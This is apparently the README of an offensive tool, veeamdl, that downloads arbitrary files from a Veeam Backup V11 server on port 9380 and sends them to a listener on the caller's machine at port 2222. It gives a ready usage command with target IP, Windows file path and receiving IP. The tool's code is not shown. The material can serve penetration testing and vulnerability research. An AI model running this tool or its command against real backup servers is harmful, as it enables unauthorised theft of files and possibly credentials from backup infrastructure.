# veeamdl

Downloads a file from a Veeam V11 server.


```sh
./veeamdl 192.168.0.10:9380 'C:\ProgramData\Veeam\Backup\Svc.VeeamBackup.log' 192.168.0.11
```

- 192.168.0.10 is Veeam IP
- 'C:\ProgramData\Veeam\Backup\Svc.VeeamBackup.log' is the file to download
- 192.168.0.11 is your IP ( port 2222 must be open )